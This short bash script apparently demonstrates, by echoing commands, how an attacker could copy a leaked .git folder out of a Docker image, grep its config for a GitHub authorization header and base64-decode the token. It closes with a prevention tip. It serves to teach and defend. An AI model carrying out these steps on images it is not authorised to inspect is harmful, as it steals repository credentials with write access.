#!/bin/bash

# This script demonstrates how an attacker could extract the GitHub token
# from a Docker image that was built with COPY . . (including .git folder)

echo "🔍 Demonstrating GitHub token extraction from Docker image..."
echo ""

IMAGE_NAME="hello-world-app:latest"

echo "1. Pull the Docker image (or use locally built one):"
echo "   docker pull username/$IMAGE_NAME"
echo ""

echo "2. Create a container from the image:"
echo "   docker create --name temp-container username/$IMAGE_NAME"
echo ""

echo "3. Copy the .git folder from the container:"
echo "   docker cp temp-container:/app/.git ./extracted-git"
echo ""

echo "4. Extract the GitHub token from .git/config:"
echo "   cat ./extracted-git/config | grep -A1 'extraheader'"
echo ""

echo "5. Decode the base64 token:"
echo "   # The token will be in format: AUTHORIZATION: basic <base64-token>"
echo "   # Decode with: echo '<base64-token>' | base64 -d"
echo ""

echo "6. Clean up:"
echo "   docker rm temp-container"
echo "   rm -rf ./extracted-git"
echo ""

echo "💀 RESULT: Attacker now has your GitHub token with write access to your repo!"
echo ""
echo "🛡️  PREVENTION: Add 'persist-credentials: false' to checkout action"
